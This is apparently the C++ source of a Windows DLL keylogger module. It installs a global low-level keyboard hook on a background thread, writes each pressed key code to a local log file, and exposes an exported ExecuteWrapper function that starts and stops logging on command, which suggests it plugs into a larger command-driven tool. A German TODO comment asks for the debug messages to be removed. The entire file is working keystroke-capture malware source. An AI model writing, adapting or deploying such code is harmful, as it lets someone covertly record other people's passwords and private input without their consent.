#include <Windows.h>
#include <cstdio>
#include <thread>

bool isLogging = false;
HHOOK keyboardHook;
HINSTANCE hInst;
HANDLE hookThreadHandle = nullptr;

//TODO: Alle debug Texte entfernen
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = p->vkCode;

        char debugMsg[64];
        sprintf_s(debugMsg, "[HOOK] Key pressed: %lu\n", vkCode);
        OutputDebugStringA(debugMsg);

        FILE* f;
        errno_t err = fopen_s(&f, "C:\\Julian\\log.txt", "a+");
        if (err != 0 || f == nullptr) {
            OutputDebugStringA("[HOOK] Failed to open log file.\n");
        }
        else {
            if (fprintf(f, "Key: %lu\n", vkCode) > 0) {
                OutputDebugStringA("[HOOK] Successfully wrote to log file.\n");
            }
            else {
                OutputDebugStringA("[HOOK] Failed to write to log file.\n");
            }
            fclose(f);
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

DWORD WINAPI HookThreadProc(LPVOID) {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInst, 0);
    if (keyboardHook == NULL) {
        OutputDebugStringA("[HOOK] Failed to install hook.\n");
        return 1;
    }

    OutputDebugStringA("[HOOK] Hook installed. Entering message loop...\n");

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    OutputDebugStringA("[HOOK] Message loop ended.\n");
    return 0;
}

const char* Execute(const char* args) {
    OutputDebugStringA("[DLL] Execute called\n");

    if (strcmp(args, "start") == 0) {
        if (!isLogging) {
            DWORD threadId;
            hookThreadHandle = CreateThread(NULL, 0, HookThreadProc, NULL, 0, &threadId);
            if (hookThreadHandle == NULL) {
                OutputDebugStringA("[HOOK] Failed to create hook thread.\n");
                return "Failed to start keylogger.";
            }

            isLogging = true;
            OutputDebugStringA("[HOOK] Keylogger started.\n");
            return "Keylogger started.";
        }
        return "Keylogger already running.";
    }
    else if (strcmp(args, "stop") == 0) {
        if (isLogging) {
            UnhookWindowsHookEx(keyboardHook);
            if (hookThreadHandle != NULL) {
                PostThreadMessage(GetThreadId(hookThreadHandle), WM_QUIT, 0, 0);
                WaitForSingleObject(hookThreadHandle, 1000); // wait up to 1s
                CloseHandle(hookThreadHandle);
                hookThreadHandle = NULL;
            }
            isLogging = false;
            OutputDebugStringA("[HOOK] Keylogger stopped.\n");
            return "Keylogger stopped.";
        }
        return "Keylogger not running.";
    }

    return "[Keylogger] Unknown command.";
}

extern "C" __declspec(dllexport) const char* ExecuteWrapper(const char* args) {
    return Execute(args);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        hInst = hModule;
        OutputDebugStringA("[DLL] Attached to process.\n");
    }
    return TRUE;
}
